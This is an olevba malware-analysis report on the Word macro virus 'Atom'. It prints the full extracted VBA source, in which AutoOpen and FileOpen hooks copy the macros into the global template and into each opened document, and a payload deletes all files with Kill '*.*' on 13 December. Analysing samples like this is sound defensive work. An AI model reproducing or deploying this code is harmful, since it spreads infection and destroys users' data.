olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Atom-6da4fbb7c04b1e7b7d127659ac21585ab99f5d32
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Atom-6da4fbb7c04b1e7b7d127659ac21585ab99f5d32 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO FileOpen.bas 
in file: Virus.MSWord.Atom-6da4fbb7c04b1e7b7d127659ac21585ab99f5d32 - OLE stream: 'Macros/VBA/FileOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Opens an existing document or template"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileOpen.MAIN"
On Error GoTo -1: On Error GoTo InfError
Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileOpen(False)
WordBasic.CurValues.FileOpen dlg
WordBasic.Dialog.FileOpen dlg
WordBasic.FileOpen dlg
WordBasic.MacroCopy "AutoOpen", dlg.Name + ":AutoOpen", 1
WordBasic.MacroCopy "FileSaveAs", dlg.Name + ":FileSaveAs", 1
WordBasic.MacroCopy "FileOpen", dlg.Name + ":FileOpen", 1
WordBasic.MacroCopy "Atom", dlg.Name + ":Atom", 1
WordBasic.FileSaveAs Format:=1
InfError:
End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Atom-6da4fbb7c04b1e7b7d127659ac21585ab99f5d32 - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim FN$
FN$ = WordBasic.[FileName$]()
On Error GoTo -1: On Error GoTo ErrorInfectGlobalTemplate
If (CheckInfected = 0) Then
    WordBasic.MacroCopy FN$ + ":FileSaveAs", "FileSaveAs", 1
    WordBasic.MacroCopy FN$ + ":FileOpen", "FileOpen", 1
    WordBasic.MacroCopy FN$ + ":AutoOpen", "AutoOpen", 1
    WordBasic.MacroCopy FN$ + ":Atom", "Atom", 1
    WordBasic.SaveTemplate
End If
WordBasic.Call "Atom"
ErrorInfectGlobalTemplate:
End Sub

Private Function CheckInfected()
Dim I
CheckInfected = 0
If (WordBasic.CountMacros(0) >= 4) Then
    For I = 1 To WordBasic.CountMacros(0)
        If (WordBasic.[MacroName$](I, 0) = "Atom") Then
            CheckInfected = 1
        End If
    Next I
End If
End Function
-------------------------------------------------------------------------------
VBA MACRO Atom.bas 
in file: Virus.MSWord.Atom-6da4fbb7c04b1e7b7d127659ac21585ab99f5d32 - OLE stream: 'Macros/VBA/Atom'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
On Error GoTo -1: On Error GoTo KillError
If WordBasic.Day(WordBasic.Now()) = 13 And WordBasic.Month(WordBasic.Now() = 12) Then
    WordBasic.Kill "*.*"
End If
KillError:
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

